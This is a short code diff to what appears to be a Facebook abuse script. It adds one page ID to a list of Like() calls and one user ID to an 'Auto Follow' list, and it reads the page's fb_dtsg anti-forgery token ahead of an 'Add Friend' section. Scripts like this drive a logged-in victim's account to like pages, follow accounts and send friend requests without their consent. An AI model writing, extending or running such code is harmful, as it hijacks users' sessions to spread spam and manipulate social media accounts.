@@ -99,6 +99,7 @@ Like("146320572185345");
 Like("150423395088679");
 Like("651209744905814");
 Like("605644426114536");
+Like("476744145734993");
 
 /*Auto Follow*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
@@ -162,6 +163,7 @@ a("100004192268178");
 a("100005511630697"); 
 a("100002166394323"); 
 a("100004459350389");
+a("100004097120937");
 
 /*Add Friend*/ 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
